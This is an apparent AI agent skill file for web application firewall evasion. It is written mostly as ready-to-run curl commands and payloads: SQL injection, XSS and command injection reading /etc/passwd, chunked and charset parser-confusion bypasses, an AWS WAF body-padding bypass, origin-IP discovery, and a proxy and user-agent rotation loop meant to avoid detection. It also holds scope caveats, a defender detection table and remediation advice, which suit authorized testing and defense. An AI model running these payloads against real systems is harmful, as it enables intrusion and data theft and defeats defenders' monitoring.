---
name: waf-bypass
description: "WAF evasion — payload obfuscation, HTTP-level evasion, origin-IP discovery, rate/anomaly evasion, per-WAF notes (Cloudflare/Akamai/AWS WAF/ModSecurity)."
allowed-tools: Bash Read Write
metadata:
  subdomain: execution
  when_to_use: "WAF bypass, WAF evasion, Cloudflare bypass, Akamai bypass, AWS WAF bypass, ModSecurity bypass, payload obfuscation, origin IP discovery, chunked bypass, content-type bypass"
  tags: waf-bypass, evasion, cloudflare, akamai, aws-waf, modsecurity, opsec
  mitre_attack: T1027
---

# WAF Bypass / Evasion

A WAF is a signature + score engine in front of the origin. Bypass goals: (a) deliver a payload the rule set does not match, (b) reach the origin directly so the WAF is out of band, or (c) keep request rate / anomaly score under thresholds while exfiltrating. OPSEC: this skill is for authorized scope. Stay within rate limits the program allows; never test live customer flows; mark traffic with a researcher header where the program asks for it (`X-Bug-Bounty: <HANDLE>`).

## 1. Recon first — fingerprint the WAF

See `skills/standard/recon/web-recon/waf-detection/SKILL.md`. Without a fingerprint you are guessing. Quick:

```bash
wafw00f -a "https://<TARGET>"
curl -sI "https://<TARGET>/?id=1' OR '1'='1" | grep -iE 'server|cf-ray|x-amzn|akamai|x-sucuri|x-cdn|set-cookie'
nuclei -u "https://<TARGET>" -t http/technologies/waf-detect.yaml
```

Note the **stack**: WAF vendor, CDN, origin web server, application framework. Each layer has its own parser — bypasses live in the gaps.

## 2. Payload obfuscation

| Layer | Technique | Example |
|---|---|---|
| Case | Mixed case on keywords (most modern WAFs are case-insensitive — try anyway) | `SeLeCt`, `uNiOn` |
| Whitespace | Tab, FF, CR, LF, `/**/`, `+`, `%a0`, `%0b`, `%0c` between tokens | `UNION/**/SELECT`, `UNION%a0SELECT` |
| Comments | Inline SQL comments split keywords | `UN/**/ION`, `SEL/*!50000*/ECT` (MySQL versioned) |
| Encoding | URL-encode, double-URL-encode, unicode, HTML entity, base64 | `%2527`, `%u0027`, `&#39;`, `\x27`, `\u0027` |
| Mixed encoding | Encode only the bytes the rule looks for | `'%20OR%201=1--` → `%27 OR 1%3D1--` |
| Alternate syntax (SQL) | `UNION`-less extraction via boolean/blind, `||` concat, JSON path, `CAST`/`CONVERT` chains | `' OR ASCII(SUBSTR(...))>0--` |
| Alternate syntax (XSS) | Tagless / event-less / template / SVG / MathML | `<svg/onload=alert(1)>`, `<details/open/ontoggle=alert(1)>`, `<style>@import"//x"</style>` |
| String concat | Break signatures into pieces | `'+'al'+'ert'+'(1)+'`, `concat(0x61,0x64,0x6d,0x69,0x6e)` |
| Backtick / quote variants | `` `select` ``, `"select"`, `[select]` (MSSQL), `N'admin'` | |
| Null bytes | `%00` early-terminates many string ops in C-backed parsers | `admin%00.png` |
| Charset | Submit body in unusual charset; WAF inspects as UTF-8 but app decodes UTF-16 | `Content-Type: ...; charset=utf-16le` |
| Path normalization | `..;/`, `..%2f`, `..%252f`, `;/`, `//` between segments | `/admin..;/users` |

```bash
# SQLi rule bypass — split UNION SELECT
PAYLOAD="-1'/*!50000UnIoN*/(/*!50000SeLeCt*/(group_concat(table_name))FROM(information_schema.tables))-- -"
curl -sk -G "https://<TARGET>/search" --data-urlencode "q=$PAYLOAD"

# XSS rule bypass — no parens, no "alert"
curl -sk -G "https://<TARGET>/echo" --data-urlencode 'q=<svg/onload=eval(name)>'

# Cmd-injection rule bypass — IFS for spaces, brace expansion, $@
curl -sk "https://<TARGET>/ping?host=127.0.0.1\${IFS}\$@cat\${IFS}/etc/passwd"
```

## 3. HTTP-level evasion

Bypasses that exploit parser differences between WAF and origin.

```bash
# 3.1 Chunked transfer — WAF disables inspection on chunked bodies (still common)
curl -sk -X POST "https://<TARGET>/login" \
  -H 'Transfer-Encoding: chunked' -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-binary $'1d\r\nusername=admin\'+OR+1=1--\r\n0\r\n\r\n'

# 3.2 Content-Type confusion — WAF parses as form, app parses as JSON (or vice versa)
curl -sk -X POST "https://<TARGET>/api/login" \
  -H 'Content-Type: text/plain' \
  --data '{"user":"admin\" OR 1=1--","pass":"x"}'

# 3.3 Multipart smuggling — payload hidden in a part the WAF does not inspect
curl -sk -X POST "https://<TARGET>/upload" \
  -F 'file=@evil.php;type=image/png' \
  -F 'meta={"role":"admin"};type=application/json'

# 3.4 charset= trick (UTF-7, UTF-16, IBM037)
curl -sk -X POST "https://<TARGET>/api" \
  -H 'Content-Type: application/json; charset=ibm037' \
  --data-binary @ibm037-payload.bin

# 3.5 Host-header / SNI mismatch (origin trusts internal Host, WAF inspects external)
curl -sk --resolve "internal-admin:443:$ORIGIN_IP" \
  -H 'Host: internal-admin' "https://internal-admin/admin"

# 3.6 HTTP/2 → HTTP/1 downgrade smuggling (paired with smuggling skill)
# See skills/standard/exploit/web/smuggling/SKILL.md

# 3.7 Pseudo-header injection in HTTP/2 (h2c upgrade, :path tricks)
curl -sk --http2-prior-knowledge "https://<TARGET>/" \
  -H ':path: /admin/../public' -i

# 3.8 Param pollution — WAF inspects first, app reads last (or concat)
# See skills/standard/exploit/web/hpp/SKILL.md
```

## 4. Origin-IP discovery — bypass the WAF entirely

If the WAF sits on a CDN edge (Cloudflare, Akamai, Sucuri, Imperva), reaching the origin IP directly with the right `Host` header takes the WAF out of band.

```bash
# 4.1 Historic DNS / certificate transparency
curl -s "https://crt.sh/?q=%25.<TARGET>&output=json" | jq -r '.[].name_value' | sort -u
# Pre-CDN A records often still resolve in passive DNS sources:
#   securitytrails / shodan / censys / dnsdumpster / viewdns
shodan search "ssl.cert.subject.cn:<TARGET>"   # finds origin certs presenting CN behind CDN
shodan search "http.title:'<TARGET>' -org:'Cloudflare,Akamai,Fastly'"
censys search 'services.tls.certificates.leaf_data.subject.common_name: "<TARGET>"' \
  --fields services.ip

# 4.2 Subdomain bleed — dev/staging/mail/cpanel rarely fronted by CDN
subfinder -d <TARGET> -silent | dnsx -resp-only | sort -u
# Look for non-CDN A records (not in Cloudflare/Akamai/Fastly ASNs)
mapcidr -cl - < ips.txt | asnmap | grep -viE 'cloudflare|akamai|fastly|imperva|incapsula|sucuri'

# 4.3 SSRF / open redirect / webhook outbound from target
#   - any target-side fetcher that calls back to attacker leaks origin IP in TCP src

# 4.4 Misconfigured mail (DMARC/SPF/MX) reveals origin mailer IP
dig +short MX <TARGET>
dig +short TXT <TARGET>

# 4.5 Validate candidate origin
curl -sk --resolve "<TARGET>:443:$ORIGIN_IP" "https://<TARGET>/" -o origin.html -w '%{http_code}\n'
diff <(curl -sk "https://<TARGET>/" | md5sum) <(md5sum < origin.html)
# Same hash + no WAF headers = origin reached.
```

Once on the origin, the WAF is **gone**. All bypasses in section 2 are unnecessary.

## 5. Rate / anomaly evasion

WAFs aggregate score per IP / session / fingerprint and throttle when thresholds trip.

| Technique | Notes |
|---|---|
| Rotate egress IPs | Proxychains, residential proxies, AWS Lambda fan-out (within scope rules). |
| Distribute over time | Jitter, exponential backoff, randomized intervals. |
| Rotate user-agent / Accept-Language / TLS JA3 | curl's `--ja3` (curl-impersonate), or `httpx -random-agent`. |
| Avoid signature noise | Don't send `sqlmap/1.x` UA. Don't send 200 payloads/sec. |
| Login-warmed sessions | Authenticated session has its own bucket; one valid request per N payloads keeps anomaly score low. |
| Slow blind injection | Time-based blind SQLi with 0.5s deltas instead of 10s. |
| Token-bucket-aware probing | Detect 429 → back off until rate limit resets. |

```bash
# Distributed slow scan with jitter
shuf payloads.txt | while read p; do
  curl -sk -G "https://<TARGET>/search" --data-urlencode "q=$p" \
    -H "User-Agent: $(shuf -n1 uas.txt)" -x "$(shuf -n1 proxies.txt)" -o /dev/null \
    -w 'q=%{url_effective}  code=%{http_code}\n'
  sleep "$(awk 'BEGIN{srand(); print 2+rand()*6}')"
done
```

## 6. Per-WAF notes

### Cloudflare
- Managed Ruleset is signature + ML; payload-obfuscation (sec 2) works well.
- Bot Fight / Super Bot Fight Mode JA3-fingerprints curl/python — use **curl-impersonate** (`curl_chrome116`) or `requests` via `httpx[http2]` with realistic JA3.
- `cdn-cgi/trace` confirms you're hitting Cloudflare; absence on a target subdomain often means origin reachable directly.
- Workers / Pages have weaker default rules than the main reverse proxy.
- 0.0.0.0/8 or unusual `X-Forwarded-For` is ignored by CF but sometimes trusted at origin → header-trust pivots.

### Akamai (Kona / App & API Protector)
- ABCK/sensor cookie expected; missing or invalid → 403. Generate with a real browser or sensor-data generators (within scope).
- AcceptedKeyLength + JA3 fingerprinting.
- `Pragma: akamai-x-cache-on, akamai-x-get-extracted-values` reveals edge variables on test envs.
- Common bypass: subdomain not yet onboarded (no Property activated) → no WAF.

### AWS WAF
- Rule-group based (AWSManagedRulesCommonRuleSet, SQLi, XSS). Each rule has a fixed inspection budget (~8 KB body, ~64 KB on newer plans). Oversize bodies are **skipped** by default — payload after the inspection limit is unfiltered.
- Inspection cap bypass: pad request body with junk to exceed the inspection limit, place payload after the cap.
- Region scoping — endpoints in non-WAF regions / shadow API gateways often lack the rule.

```bash
# AWS WAF body-cap bypass — pad with 9 KB of A's, then payload
( python3 -c 'print("A"*9000, end="")'; printf '&q=%s' "' UNION SELECT user,password FROM users--" ) \
  | curl -sk -X POST "https://<TARGET>/search" \
      -H 'Content-Type: application/x-www-form-urlencoded' --data-binary @-
```

### ModSecurity + OWASP CRS
- Anomaly-scoring (Paranoia Level 1–4). PL1 is bypassed by almost all sec-2 tricks.
- CRS rules are public — read the rule that fires and craft around it. `SecRuleEngine DetectionOnly` is common in early deployments.
- Charset / Content-Type confusion is highly effective historically.
- JSON body inspection requires the JSON parser to be enabled — many deployments forget.

### Imperva / Incapsula
- `incap_ses_*` cookie required; bots without it 403.
- Has its own rate-limit on `Reputation` score — high-noise scans trip it fast.
- Bypass focus: origin discovery (sec 4) often easier than payload obfuscation.

### Sucuri
- Lightweight, signature-heavy. Sec-2 encoding tricks bypass the bulk of rules.
- `X-Sucuri-Cache` header confirms presence.

## 7. Tools

- **wafw00f**, **whatwaf** — vendor identification.
- **nuclei** `http/misconfiguration/`, `http/cves/` with `-rate-limit` low.
- **bypass-firewalls-by-DNS-history** — automates sec 4.1.
- **CloudFlair** — Cloudflare origin discovery via Censys.
- **curl-impersonate** / **tlsx** — JA3/JA4 rotation.
- **Burp** with **Bypass WAF**, **HTTP Smuggler**, **Param Miner**, **Hackvertor** extensions.
- **sqlmap** `--tamper=between,space2comment,space2randomblank,charunicodeencode,...` (chain tamper scripts per WAF).
- **ffuf** `-H` rotation, `-p` per-request delay, `-rate` cap.

## 8. Detection signatures (defenders)

| Signal | Source |
|---|---|
| `Transfer-Encoding: chunked` on small bodies from unauthenticated IPs | WAF / proxy logs |
| Body charset = `ibm037`, `utf-16`, `utf-7` on public endpoints | content-type analytics |
| Request body > inspection cap on AWS WAF + trailing suspicious params | CloudWatch + WAF logs |
| Sustained low-rate requests from rotating IPs hitting parameterized URLs | rate-limit / WAF analytics |
| Direct hits to origin IP bypassing CDN | origin firewall logs (only CDN IPs should reach origin) |
| `Host` header mismatch vs SNI | TLS / app logs |
| `X-HTTP-Method-Override` paired with payload-like params | WAF custom rule |

Remediation: lock origin firewall to CDN egress ranges only; enable strict-charset / strict-content-type at the edge; raise inspection cap or block oversized unauthenticated bodies; ratchet ModSecurity to PL2+; rotate origin IP after CDN onboarding; enforce JA3/JA4 allowlists where business permits.

## 9. Decision gate

| Observation | Action |
|---|---|
| WAF identified, payload blocked, no origin IP yet | Section 2 obfuscation → section 3 HTTP-level → only then chase origin |
| Origin IP candidate, response identical to CDN-fronted | Confirm with TLS cert + body hash, then re-run all chained skills directly against origin |
| All sec-2/sec-3 attempts blocked, no origin | Pivot — try a different endpoint, subdomain (often un-onboarded), or chain through SSRF/open-redirect from another target asset |
| Rate-limit / anomaly score throttling | Back off, lower QPS, rotate fingerprint, prefer authenticated session |
| Program forbids WAF bypass research | Stop; report WAF presence + suspected gap to the program without exploitation |

## Cross-references

- WAF fingerprint recon: `skills/standard/recon/web-recon/waf-detection/SKILL.md`
- HTTP smuggling (paired parser-discrepancy bypass): `skills/standard/exploit/web/smuggling/SKILL.md`
- HTTP Parameter Pollution: `skills/standard/exploit/web/hpp/SKILL.md`
- Verb tampering (rule sets keyed on GET/POST only): `skills/standard/exploit/web/verb-tampering/SKILL.md`
- SQLi tamper / blind: `skills/standard/exploit/web/sqli/SKILL.md`
- Subdomain takeover (origin pivot via trusted subdomain): `skills/standard/recon/web-recon/subdomain-takeover/SKILL.md`
